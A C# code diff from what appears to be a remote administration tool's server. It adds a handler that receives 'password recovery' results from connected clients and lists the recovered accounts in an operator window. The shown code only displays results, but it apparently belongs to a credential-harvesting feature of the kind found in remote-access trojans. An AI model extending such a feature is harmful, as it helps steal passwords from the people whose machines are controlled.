@@ -177,6 +177,25 @@ namespace RemoteAdmin.Server.Networking
                             Console.WriteLine($"Received task export result: {exportResponse.Success}");
                             _dispatcher.Invoke(() => client.TaskSchedulerWindow?.HandleExportResult(exportResponse));
                         }
+                        else if (msg is PasswordRecoveryResponseMessage passwordResponse)
+                        {
+                            Console.WriteLine($"Received password recovery response: {passwordResponse.Success}, {passwordResponse.Accounts?.Count ?? 0} accounts");
+                            _dispatcher.Invoke(() =>
+                            {
+                                if (passwordResponse.Success)
+                                {
+                                    client.PasswordRecoveryWindow?.UpdatePasswordList(passwordResponse.Accounts);
+                                }
+                                else
+                                {
+                                    System.Windows.MessageBox.Show(
+                                        $"Password recovery failed: {passwordResponse.ErrorMessage}",
+                                        "Password Recovery Error",
+                                        System.Windows.MessageBoxButton.OK,
+                                        System.Windows.MessageBoxImage.Error);
+                                }
+                            });
+                        }
                     }
                 }
             }
